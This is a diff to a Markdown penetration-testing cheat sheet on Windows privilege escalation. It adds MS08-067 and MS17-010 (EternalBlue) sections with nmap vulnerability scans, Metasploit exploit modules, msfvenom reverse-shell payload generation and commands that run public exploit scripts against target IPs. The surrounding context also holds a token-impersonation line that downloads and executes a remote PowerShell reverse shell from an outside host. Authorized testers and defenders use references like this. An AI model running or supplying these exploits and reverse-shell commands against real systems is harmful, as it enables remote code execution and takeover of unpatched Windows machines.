@@ -17,6 +17,7 @@
 * [EoP - Runas](#eop---runas)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposures)
   * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
+  * [MS08-067 (NetAPI)](#ms08-067-netapi)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
 
@@ -24,6 +25,9 @@
 
 - [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
 - [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
+    ```powershell
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
+    ```
 - [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 - [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
     ```powershell
@@ -623,6 +627,37 @@ Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
 
+### MS08-067 (NetAPI)
+
+Check the vulnerability with the following nmap script.
+
+```c
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
+```
+
+Metasploit modules to exploit `MS08-067 NetAPI`.
+
+```powershell
+exploit/windows/smb/ms08_067_netapi
+```
+
+If you can't use Metasploit and only want a reverse shell.
+
+```powershell
+https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+
+Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
+Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
+Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
+Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
+Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
+Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
+Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
+python ms08-067.py 10.0.0.1 6 445
+```
+
+
 ### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 
 Check if the patch is installed : `wmic qfe list | find "3139914"`
@@ -639,12 +674,31 @@ Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 
 ### MS17-010 (Eternal Blue)
 
+Check the vulnerability with the following nmap script.
+
 ```c
 nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
 ```
 
+Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.
 
+```powershell
+auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection
+exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+```
 
+If you can't use Metasploit and only want a reverse shell.
+
+```powershell
+git clone https://github.com/helviojunior/MS17-010
+
+# generate a simple reverse shell to use
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+python2 send_and_execute.py 10.0.0.1 revshell.exe
+```
 
 
 ## References
